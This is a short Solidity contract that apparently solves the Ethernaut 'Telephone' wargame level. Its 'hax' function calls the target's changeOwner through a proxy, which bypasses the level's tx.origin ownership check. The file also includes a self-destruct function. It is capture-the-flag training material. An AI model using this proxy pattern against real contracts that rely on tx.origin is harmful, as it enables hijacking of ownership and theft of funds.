pragma solidity 0.4.18;

import "./EthernautTelephone.sol";

contract TelephoneProxy {
    address public owner;
    address public target;
    
    function TelephoneProxy(address _target) public {
        target = _target;
        owner = msg.sender;
    }
    
    function hax(address phoneOwner) public {
        require(msg.sender == owner);
        Telephone phone = Telephone(target);
        phone.changeOwner(phoneOwner);
    }
    
    function kill() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}
